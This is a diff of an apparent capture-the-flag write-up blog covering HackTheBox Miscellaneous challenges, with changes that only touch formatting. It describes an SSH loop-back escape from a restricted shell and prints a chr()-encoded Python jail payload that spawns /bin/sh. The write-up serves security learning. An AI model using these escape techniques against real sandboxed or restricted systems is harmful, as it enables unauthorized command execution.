@@ -19,7 +19,7 @@
 &lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
 &lt;p>&lt;strong>Category:&lt;/strong> Miscellaneous&lt;/p>
 &lt;p>&lt;strong>Difficulty:&lt;/strong> Very Easy&lt;/p>
-&lt;p>We are given a website to work with. Initially, connection to the website would result in &lt;strong>&amp;ldquo;404 Not Found&amp;rdquo;&lt;/strong>. I then went to read the descriptions, and from it, I got to know that we should send at least &lt;strong>1000 GET requests&lt;/strong> to &lt;strong>/flag&lt;/strong> to maybe get the flag.&lt;/p>
+&lt;p>We are given a website to work with. Initially, connection to the website would result in &lt;strong>&amp;ldquo;404 Not Found&amp;rdquo;&lt;/strong>. I then went to read the descriptions, and from it, I got to know that we should send at least &lt;strong>1000 GET requests&lt;/strong> to &lt;code>/flag&lt;/code> to maybe get the flag.&lt;/p>
 &lt;p>I used this below Python script to automate the task.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
@@ -71,7 +71,7 @@
 &lt;p>To cope with this, we can use a trick called &lt;strong>SSH self loop-back&lt;/strong>, which means we initiate a SSH connection inside a SSH, since restricted shell doesn&amp;rsquo;t prevent us from using SSH commands.&lt;/p>
 &lt;p>First, we connect to the SSH server using the username &lt;strong>restricted&lt;/strong>.&lt;/p>
 &lt;img src="misc2.png" alt="dnSpy" width="1000"/>
-&lt;p>From the source, we also know that the exposed port is 1337. Then, we can use SSH self loop-back to have the permission to use cat, since we also know that &lt;strong>flag.txt&lt;/strong> is changed to &lt;strong>flag_&lt;/strong>* (with * represents some random bytes) and lies in plainsight.&lt;/p>
+&lt;p>From the source, we also know that the exposed port is &lt;strong>1337&lt;/strong>. Then, we can use SSH self loop-back to have the permission to use cat, since we also know that &lt;code>flag.txt&lt;/code> is changed to &lt;code>flag_*&lt;/code> (with * represents some random bytes) and lies in plainsight.&lt;/p>
 &lt;img src="misc3.png" alt="dnSpy" width="1000"/>
 &lt;img src="misc5.png" alt="dnSpy" width="1000"/>
 &lt;p>Flag is: &lt;strong>HTB{r35tr1ct10n5_4r3_p0w3r1355}&lt;/strong>&lt;/p>
@@ -151,8 +151,8 @@
 &lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
 &lt;p>&lt;strong>Category:&lt;/strong> Miscellaneous&lt;/p>
 &lt;p>&lt;strong>Difficulty:&lt;/strong> Easy&lt;/p>
-&lt;p>There are 2 noticable functions called within &lt;em>main()&lt;/em> which is &lt;em>game()&lt;/em> and &lt;em>get_prize()&lt;/em>.&lt;/p>
-&lt;p>The &lt;em>get_prize()&lt;/em> function simply gives us the flag so we won&amp;rsquo;t go too deep into it. But in order for this function to be called. We have to win 100 games of rock, paper, scissors. A.K.A. the &lt;em>game()&lt;/em> function.&lt;/p>
+&lt;p>There are 2 noticable functions called within &lt;strong>main()&lt;/strong> which is &lt;strong>game()&lt;/strong> and &lt;strong>get_prize()&lt;/strong>.&lt;/p>
+&lt;p>The &lt;strong>get_prize()&lt;/strong> function simply gives us the flag so we won&amp;rsquo;t go too deep into it. But in order for this function to be called. We have to win 100 games of rock, paper, scissors. A.K.A. the &lt;strong>game()&lt;/strong> function.&lt;/p>
 &lt;p>Having analyzed it, we got the following code:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">game&lt;/span>&lt;span class="p">()&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
@@ -219,10 +219,10 @@
 &lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
 &lt;p>&lt;strong>Category:&lt;/strong> Miscellaneous&lt;/p>
 &lt;p>&lt;strong>Difficulty:&lt;/strong> Medium&lt;/p>
-&lt;p>A classic pyjail challenge with no source code. It filtered out some special characters like &lt;strong>&amp;rsquo;, &amp;ldquo;, _, ., /&lt;/strong> so we couldn&amp;rsquo;t directly execute any code.&lt;/p>
+&lt;p>A classic pyjail challenge with no source code. It filtered out some special characters like &lt;code>' &amp;quot; _ . /&lt;/code> so we couldn&amp;rsquo;t directly execute any code.&lt;/p>
 &lt;p>One way to bypass this is to break down the string of code we want to execute into individual characters and concatenate them together using the &lt;em>+&lt;/em> operator.&lt;/p>
-&lt;p>We can bypass the &lt;strong>&amp;rsquo;&lt;/strong> and &lt;strong>&amp;rdquo;&lt;/strong> filter simply by using chr(hex-value-of-the-ascii-character) to make the character we want.&lt;/p>
-&lt;p>For this I used &lt;code>eval(&amp;quot;\__import__('os').system('/bin/sh')&amp;quot;)&lt;/code>. The payload for this is:&lt;/p>
+&lt;p>We can bypass the &lt;code>'&lt;/code> and &lt;code>&amp;quot;&lt;/code> filter simply by using &lt;code>chr(hex-value-of-the-ascii-character)&lt;/code> to make the character we want.&lt;/p>
+&lt;p>For this I used &lt;code>eval(&amp;quot;__import__('os').system('/bin/sh')&amp;quot;)&lt;/code>. The payload for this is:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x27)+chr(0x29))
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now with all the pieces together, let&amp;rsquo;s send our exploit.&lt;/p>
 &lt;img src="flag3.png" alt="FLAG" width="1000"/>
